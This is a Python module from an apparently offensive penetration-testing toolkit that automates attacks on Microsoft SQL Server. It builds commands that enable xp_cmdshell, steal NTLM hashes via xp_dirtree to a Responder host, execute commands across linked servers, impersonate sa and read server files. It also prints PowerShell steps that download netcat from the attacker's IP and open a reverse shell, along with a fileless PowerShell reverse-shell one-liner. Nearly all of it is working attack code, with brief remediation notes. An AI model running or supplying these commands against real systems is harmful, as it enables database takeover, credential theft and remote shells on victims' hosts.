"""
Module: MSSQL Abuse — xp_cmdshell / Linked Servers / NTLM Relay / File Read
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("MSSQL ABUSE", "xp_cmdshell / Linked Servers / NTLM Relay")
    dom    = input_or_session("domain",   "Domain")
    user   = input_or_session("username", "Username")
    pw     = input_or_session("password", "Password")
    target = prompt("MSSQL Server IP")
    base   = f"{imp('mssqlclient.py')} {dom}/{user}:'{pw}'@{target} -windows-auth"

    attacker = input_or_session("attacker_ip", "Attacker IP")

    print("""
  [1]  Connect & Enumerate          (DBs/users/linked servers)
  [2]  Enable & Run xp_cmdshell
  [3]  NTLM Hash Steal              (xp_dirtree UNC)
  [4]  Linked Server Command Exec
  [5]  Impersonate SA / sysadmin
  [6]  Read File via OPENROWSET
  [7]  PowerUpSQL — Domain Discovery & Link Crawl
  [8]  PowerUpSQL — Reverse Shell via Linked Server
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        for q in [
            "SELECT name FROM sys.databases;",
            "SELECT name,type_desc FROM sys.server_principals WHERE type IN ('S','U','G');",
            "SELECT srvname,isremote FROM sysservers;",
            "SELECT IS_SRVROLEMEMBER('sysadmin');",
        ]:
            run_cmd(f'{base} -command "{q}"')

    elif c == "2":
        run_cmd(f"{base} -command \"EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;\"")
        cmd = prompt("OS command to run")
        run_cmd(f'{base} -command "EXEC xp_cmdshell \'{cmd}\';"')
        add_finding("xp_cmdshell Enabled", "Critical",
                    f"OS command execution on {target}", "Disable xp_cmdshell; least-privilege MSSQL account")

    elif c == "3":
        lhost = prompt("Attacker IP (Responder running)")
        run_cmd(f'{base} -command "EXEC xp_dirtree \'\\\\\\\\{lhost}\\\\share\';"')
        info("Capture NTLM hash with: sudo responder -I eth0 -rdw")

    elif c == "4":
        linked = prompt("Linked server name")
        cmd    = prompt("Command to run")
        run_cmd(f'{base} -command "EXEC (\'EXEC xp_cmdshell \\\'{cmd}\\\'\') AT [{linked}];"')

    elif c == "5":
        run_cmd(f'{base} -command "EXECUTE AS LOGIN = \'sa\'; SELECT IS_SRVROLEMEMBER(\'sysadmin\');"')

    elif c == "6":
        fpath = prompt("File path (e.g. C:\\\\Windows\\\\win.ini)")
        run_cmd(f'{base} -command "SELECT * FROM OPENROWSET(BULK N\'{fpath}\', SINGLE_CLOB) AS C;"')

    elif c == "7":
        instance = prompt("MSSQL instance (e.g. dbserver31.tech.finance.corp)")
        print(f"""
  {NEON_CYN}PowerUpSQL — Discovery & Link Crawl:{RST}

  # Import module
  Import-Module .\\PowerUpSQL.ps1

  # Discover MSSQL instances in domain (DNS/LDAP/broadcast)
  Get-SQLInstanceDomain
  Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
  Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

  # Audit for privilege escalation vectors
  Invoke-SQLAudit -Instance {instance} -Verbose

  # Check current user access level
  Get-SQLQuery -Instance {instance} -Query "SELECT IS_SRVROLEMEMBER('sysadmin')"

  # Crawl linked servers recursively
  Get-SQLServerLinkCrawl -Instance {instance} -Verbose

  # Execute query across all links
  Get-SQLServerLinkCrawl -Instance {instance} -Query "exec master..xp_cmdshell 'hostname'"

  {NEON_CYN}Linked server trust chain:{RST}
  {DIM}• Each link inherits its own SQL login — often SA on remote
  • Links can chain: A → B → C (crawl finds all hops)
  • xp_cmdshell runs as SQL service account on remote host
  • If SQL svc account = SYSTEM or domain admin → RCE → shell{RST}
""")

    elif c == "8":
        instance = prompt("Entry MSSQL instance (first hop)")
        port     = prompt("Reverse shell port") or "4444"
        print(f"""
  {NEON_CYN}PowerUpSQL — Reverse Shell via Linked Server:{RST}

  Import-Module .\\PowerUpSQL.ps1

  # Step 1 — confirm xp_cmdshell works on linked server
  Get-SQLServerLinkCrawl -Instance {instance} -Query "exec master..xp_cmdshell 'whoami'" -Verbose

  # Step 2 — download nc64.exe to target via linked server
  Get-SQLServerLinkCrawl -Instance {instance} `
    -Query 'exec master..xp_cmdshell "powershell -c iwr http://{attacker}/nc64.exe -OutFile C:/programdata/nc.exe"'

  # Step 3 — execute reverse shell
  Get-SQLServerLinkCrawl -Instance {instance} `
    -Query 'exec master..xp_cmdshell "powershell C:/programdata/nc.exe {attacker} {port} -e cmd.exe"'

  {NEON_CYN}Attacker setup (before step 2):{RST}
  # Serve nc64.exe
  python3 -m http.server 80

  # Listen for shell
  nc -lvnp {port}

  {NEON_CYN}OPSEC alternatives (avoid writing to disk):{RST}
  # PowerShell reverse shell (no nc needed)
  Get-SQLServerLinkCrawl -Instance {instance} `
    -Query 'exec master..xp_cmdshell "powershell -nop -c \\"$c=New-Object Net.Sockets.TCPClient('{attacker}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\\"PS \\"+((pwd).Path)+\\">> \\";$sb=[text.encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length)}}\\"'

  {DIM}• impacket-mssqlclient can also chain via -link flag
  • Fully interactive shell: Evil-WinRM or PSSession after shell{RST}
""")
        add_finding("MSSQL Linked Server RCE", "Critical",
                    f"Command execution via linked server chain on {instance}",
                    "Audit/remove unnecessary linked servers; restrict xp_cmdshell")

    pause()
